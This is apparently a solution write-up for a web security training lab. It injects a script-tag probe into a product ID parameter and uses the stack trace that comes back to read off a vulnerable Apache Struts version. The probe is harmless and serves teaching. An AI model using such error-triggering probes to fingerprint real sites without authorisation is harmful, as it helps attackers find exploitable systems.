# [Lab: Information disclosure in error messages](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-error-messages)

This lab's verbose error messages reveal that it is using a vulnerable version of a third-party framework. To solve the lab, obtain and submit the version number of this framework.

---
## Solution

- payload: `<script>alert(12)</script>`
- `URL/product?productId=%3Cscript%3Ealert(12)%3C/script%3E`
- version `2 2.3.31`

```java
Internal Server Error: java.lang.NumberFormatException: For input string: "<script>alert(12)</script>"
	at java.base/java.lang.NumberFormatException.forInputString(NumberFormatException.java:67)
	at java.base/java.lang.Integer.parseInt(Integer.java:668)
	at java.base/java.lang.Integer.parseInt(Integer.java:786)
	at lab.y.o.c.u.M(Unknown Source)
	at lab.k.n2.w.e.R(Unknown Source)
	at lab.k.n2.s.p.b.u(Unknown Source)
	at lab.k.n2.s.k.lambda$handleSubRequest$0(Unknown Source)
	at c.r.i.e.lambda$null$3(Unknown Source)
	at c.r.i.e.b(Unknown Source)
	at c.r.i.e.lambda$uncheckedFunction$4(Unknown Source)
	at java.base/java.util.Optional.map(Optional.java:260)
	at lab.k.n2.s.k.I(Unknown Source)
	at lab.server.d.o.w.B(Unknown Source)
	at lab.k.n2.t.W(Unknown Source)
	at lab.k.n2.t.B(Unknown Source)
	at lab.server.d.o.k.g.a(Unknown Source)
	at lab.server.d.o.k.p.lambda$handle$0(Unknown Source)
	at lab.y.q.w.a.R(Unknown Source)
	at lab.server.d.o.k.p.c(Unknown Source)
	at lab.server.d.o.y.g(Unknown Source)
	at c.r.i.e.lambda$null$3(Unknown Source)
	at c.r.i.e.b(Unknown Source)
	at c.r.i.e.lambda$uncheckedFunction$4(Unknown Source)
	at lab.server.f5.u(Unknown Source)
	at lab.server.d.o.y.i(Unknown Source)
	at lab.server.d.v.c.v(Unknown Source)
	at lab.server.d.g.X(Unknown Source)
	at lab.server.d.i.X(Unknown Source)
	at lab.server.fd.N(Unknown Source)
	at lab.server.fd.s(Unknown Source)
	at lab.o.z.lambda$consume$0(Unknown Source)
	at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1136)
	at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:635)
	at java.base/java.lang.Thread.run(Thread.java:833)

Apache Struts 2 2.3.31
```